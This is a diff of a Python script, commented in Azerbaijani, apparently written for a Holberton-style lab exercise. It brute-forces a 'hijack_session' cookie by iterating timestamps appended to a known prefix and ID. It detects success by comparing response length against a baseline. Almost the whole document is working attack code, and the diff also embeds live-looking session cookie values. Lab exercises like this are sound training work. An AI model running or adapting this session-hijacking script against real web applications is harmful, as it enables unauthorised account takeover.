@@ -1,16 +1,10 @@
 import requests
 import json
 
-# Prefix (Sizin ID-nin başlanğıc hissəsi)
-prefix = "9f7d21f7-701b-4db9-b3d-4631"
+prefix = "9f7d21f7-701b-4db9-b3d"
+session_id = "4631063"
+target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"
 
-# Target ID (62 və 64 arasındakı hədəf)
-session_id = "063"
-
-# URL (api hissəsi silindi, a1 ilə əvəz olundu)
-target_url = "http://web0x01.hbtn/a1/hijack_session/login"
-
-# Timestamp aralığı (Verdiyiniz vaxtlar)
 start_timestamp = 17687189065
 end_timestamp = 17687189237
 
@@ -23,7 +17,7 @@ headers = {
 }
 
 # Sənin session cookie-n
-your_session = "7Gaul-zp4WlIodteHLmk2I3iNLKDLTao1mThqHRFi70.OIBNREztYLLn7FKAZAdgmDQCvrU"
+your_session = "sWTxC3A4cSMX6GzOPcHooidBPxiypx6DHW6_kCvkWvE. 89b5PcLQmhDkHKGRXB31t5RLP7o"
 
 # Login data (boş və ya random)
 login_data = json.dumps({"email": "test@test.com", "password": "test"})
@@ -35,21 +29,20 @@ baseline_cookies = {
 }
 baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers, timeout=10)
 baseline_len = len(baseline.text)
-print(f"[] Baseline response:  {baseline.text[:200]}")
-print(f"[] Baseline length: {baseline_len}")
-print(f"[] Araliq: {start_timestamp} - {end_timestamp}\n")
+print(f"[*] Baseline response:  {baseline.text[:200]}")
+print(f"[*] Baseline length: {baseline_len}")
+print(f"[*] Araliq: {start_timestamp} - {end_timestamp}\n")
 
 for ts in range(start_timestamp, end_timestamp + 1):
-    # DİQQƏT: Buradakı format sizin kodunuzda olduğu kimidir.
     cookie_value = f"{prefix}-{session_id}-{ts}"
-
+    
     cookies = {
         "hijack_session": cookie_value,
         "session": your_session
     }
-
+    
     r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers, timeout=10)
-
+    
     # Fərqli cavab və ya "success" varsa
     if len(r.text) != baseline_len or "success" in r.text.lower():
         print(f"\n[+] TAPILDI!")
@@ -57,7 +50,7 @@ for ts in range(start_timestamp, end_timestamp + 1):
         print(f"[+] Cookie: {cookie_value}")
         print(f"[+] Response: {r.text}")
         break
-
-    print(f"[] {ts}", end='\r')
+    
+    print(f"[*] {ts}", end='\r')
 else:
     print("\n[-] Tapilmadi")
